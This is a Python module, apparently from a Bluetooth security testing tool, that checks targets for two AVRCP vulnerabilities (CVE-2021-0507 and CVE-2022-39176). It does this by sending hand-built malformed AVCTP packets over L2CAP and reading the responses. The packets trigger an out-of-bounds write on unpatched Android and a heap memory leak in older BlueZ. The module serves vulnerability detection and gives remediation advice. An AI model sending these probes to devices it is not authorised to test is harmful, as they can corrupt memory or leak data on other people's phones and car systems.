"""CVE detection checks for AVRCP (Audio/Video Remote Control Profile).

Checks implemented:
  - CVE-2021-0507: AVRCP REGISTER_NOTIFICATION with invalid event_id=0x00 (OOB write,
    Android 8.1-11)
  - CVE-2022-39176: BlueZ AVRCP GET_CAPABILITIES heap information disclosure (BlueZ < 5.60)

Each check function returns a list[dict] of findings. An empty list means either
not applicable (service absent) or the target appears patched.
"""

import socket
import time

from blue_tap.attack.cve_framework import make_cve_finding as _finding


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------

def _has_avrcp_service(services: list[dict]) -> bool:
    """Return True if the services list contains an AVRCP Controller or Target UUID."""
    for svc in services:
        uuid = svc.get("uuid", "").lower()
        if "110e" in uuid or "110c" in uuid:
            return True
    return False


def _connect_avctp(address: str, timeout: float = 5.0):
    """Open an L2CAP SEQPACKET socket to PSM 0x0017 (AVCTP).

    Returns the connected socket, or None on failure.
    """
    try:
        AF_BLUETOOTH = getattr(socket, "AF_BLUETOOTH", 31)
        BTPROTO_L2CAP = getattr(socket, "BTPROTO_L2CAP", 0)
        sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
        sock.settimeout(timeout)
        # L2CAP address tuple: (bdaddr, psm)
        sock.connect((address, 0x0017))
        return sock
    except Exception:
        return None


# ---------------------------------------------------------------------------
# CVE-2021-0507 — AVRCP REGISTER_NOTIFICATION event_id=0x00 OOB Write
# ---------------------------------------------------------------------------

def _check_avrcp_metamsg_oob(address: str, services: list[dict]) -> list[dict]:
    """Probe for CVE-2021-0507: AVRCP REGISTER_NOTIFICATION with invalid event_id=0x00.

    Sends a single AVCTP/AV/C VENDOR_DEPENDENT REGISTER_NOTIFICATION command with
    event_id=0x00 (below the valid range 0x01-0x0D). Unpatched Android 8.1-11
    accepts this and performs an OOB write in the notification handler.

    Gate: target must advertise AVRCP Controller (0x110E) or Target (0x110C).
    """
    if not _has_avrcp_service(services):
        return [_finding(
            "INFO", "CVE-2021-0507: Not Applicable",
            "AVRCP REGISTER_NOTIFICATION OOB check skipped — no AVRCP service "
            "(UUID 110E/110C) found. Check only applies to devices with AVRCP.",
            cve="CVE-2021-0507", status="not_applicable", confidence="high",
            evidence="No AVRCP UUID (110E/110C) in SDP service list",
        )]

    # Build the probe packet
    # AVCTP single-packet header (3 bytes):
    #   byte 0: (transaction_label=0 << 4) | (packet_type=SINGLE=0 << 2) | cr_ipid=0 → 0x00
    #   bytes 1-2: Profile ID = 0x110E big-endian
    avctp_hdr = bytes([0x00, 0x11, 0x0E])

    # AV/C VENDOR_DEPENDENT REGISTER_NOTIFICATION with event_id=0x00 (invalid)
    avc_cmd = bytes([
        0x00,              # ctype = CONTROL
        0x48,              # subunit = Panel (subunit_type=0x09 << 3 | subunit_id=0)
        0xFF,              # opcode = VENDOR_DEPENDENT
        0x00, 0x19, 0x58,  # company_id = Bluetooth SIG
        0x31,              # PDU_id = REGISTER_NOTIFICATION
        0x00,              # reserved
        0x00, 0x05,        # param_length = 5
        0x00,              # event_id = 0x00 (INVALID — valid range is 0x01-0x0D)
        0x00, 0x00, 0x00, 0x00,  # interval
    ])
    packet = avctp_hdr + avc_cmd

    sock = None
    try:
        sock = _connect_avctp(address, timeout=5.0)
        if sock is None:
            return []

        sock.sendall(packet)

        # Wait up to 3 seconds for a response
        sock.settimeout(3.0)
        try:
            response = sock.recv(256)
        except socket.timeout:
            # No response within timeout — cannot determine vulnerability
            return []

        if len(response) < 4:
            return []

        # Parse AV/C response at offset 3 (after 3-byte AVCTP header)
        resp_type = response[3]

        # 0x0A = REJECTED → patched
        if resp_type == 0x0A:
            return []

        # Only 0x0F = INTERIM means the device accepted the invalid event_id.
        # 0x08 = NOT_IMPLEMENTED and other codes mean the command is unsupported,
        # not that it was processed — do NOT flag these as vulnerable.
        if resp_type != 0x0F:
            return []

        return [_finding(
            "HIGH",
            "AVRCP REGISTER_NOTIFICATION OOB Write (CVE-2021-0507)",
            "Target accepted REGISTER_NOTIFICATION with invalid event_id=0x00 (below valid range "
            "0x01). Unpatched Android 8.1-11 processes this, writing OOB in the notification "
            "handler.",
            cve="CVE-2021-0507",
            impact="RCE in Bluetooth process on Android 8.1-11 via crafted AVRCP notification",
            remediation="Apply Android Security Bulletin 2021-01-01 patch",
            status="confirmed",
            confidence="high",
            evidence=(
                f"AVRCP REGISTER_NOTIFICATION event_id=0x00 response_type=0x{resp_type:02X} "
                f"(not REJECTED)"
            ),
        )]

    except Exception:
        return []
    finally:
        if sock is not None:
            try:
                sock.close()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# CVE-2022-39176 — BlueZ AVRCP GET_CAPABILITIES Heap Information Disclosure
# ---------------------------------------------------------------------------

def _check_avrcp_getcap_leak(address: str, services: list[dict]) -> list[dict]:
    """Probe for CVE-2022-39176: BlueZ AVRCP GET_CAPABILITIES OOB heap read.

    Sends GET_CAPABILITIES with params_len=1 but provides only a capability_id
    byte and no capability count/data. BlueZ < 5.60 reads beyond the buffer in
    avrcp_get_capabilities_rsp(), leaking heap memory back to the caller.

    The check sends the malformed probe 3 times (separate connections) and
    compares bytes at offsets 13-20 of each response. If the same offset
    returns different non-zero values across probe 1 and probe 3, this is a
    strong indicator of heap memory being leaked (BlueZ < 5.60).

    Gate: target must advertise AVRCP Controller (0x110E) or Target (0x110C).

    No manufacturer/stack pre-filtering is applied. The "manufacturer" reported
    by hcitool info is the HCI controller chip vendor (Qualcomm, Broadcom,
    MediaTek, etc.) — this identifies the silicon, NOT the Bluetooth stack.
    A Qualcomm chip on an automotive Linux IVI runs BlueZ just as much as a
    Raspberry Pi with an Intel adapter does. Stack identity cannot be reliably
    inferred from chip vendor over the air.

    The heap-jitter behavioral differential IS the detection. Any non-BlueZ
    stack will return consistent (non-jittery) responses, producing no finding.
    """
    if not _has_avrcp_service(services):
        return [_finding(
            "INFO", "CVE-2022-39176: Not Applicable",
            "AVRCP GET_CAPABILITIES heap leak check skipped — no AVRCP service "
            "(UUID 110E/110C) found. Check only applies to devices with AVRCP.",
            cve="CVE-2022-39176", status="not_applicable", confidence="high",
            evidence="No AVRCP UUID (110E/110C) in SDP service list",
        )]

    # Build the malformed GET_CAPABILITIES probe
    avctp_hdr = bytes([0x00, 0x11, 0x0E])
    avc_cmd = bytes([
        0x01,              # ctype = STATUS
        0x48,              # subunit = Panel
        0xFF,              # opcode = VENDOR_DEPENDENT
        0x00, 0x19, 0x58,  # company_id = Bluetooth SIG
        0x10,              # PDU_id = GET_CAPABILITIES
        0x00,              # reserved
        0x00, 0x01,        # param_length = 1 (declare 1 byte — no capability data follows)
        0x03,              # capability_id = EVENTS_SUPPORTED (but no event bytes follow)
    ])
    packet = avctp_hdr + avc_cmd

    responses: list[bytes] = []

    for _ in range(3):
        sock = None
        try:
            sock = _connect_avctp(address, timeout=5.0)
            if sock is None:
                return []

            sock.sendall(packet)
            sock.settimeout(3.0)

            try:
                resp = sock.recv(256)
                responses.append(resp)
            except socket.timeout:
                responses.append(b"")

        except Exception:
            responses.append(b"")
        finally:
            if sock is not None:
                try:
                    sock.close()
                except Exception:
                    pass

        # Small delay between probes
        time.sleep(0.2)

    if len(responses) < 3:
        return []

    # Jitter check: compare bytes at offsets 13-20 across probe 1 and probe 3
    r1 = responses[0]
    r3 = responses[2]

    if len(r1) <= 13 or len(r3) <= 13:
        return []

    jitter_offset = None
    for i in range(13, min(20, len(r1), len(r3))):
        b1 = r1[i]
        b3 = r3[i]
        if b1 != b3 and b1 != 0 and b3 != 0:
            jitter_offset = i
            break

    if jitter_offset is None:
        return []

    return [_finding(
        "HIGH",
        "BlueZ AVRCP GET_CAPABILITIES Heap Information Disclosure (CVE-2022-39176)",
        "BlueZ target returned varying bytes in GET_CAPABILITIES response with malformed "
        "params_len=1. OOB read in avrcp_get_capabilities_rsp() leaks heap memory.",
        cve="CVE-2022-39176",
        impact="Heap address/data leak — may defeat ASLR; memory contents disclosed",
        remediation="Update BlueZ to >= 5.60",
        status="confirmed",
        confidence="high",
        evidence=(
            f"GET_CAPABILITIES response bytes vary across 3 probes "
            f"(jitter at offset {jitter_offset})"
        ),
    )]
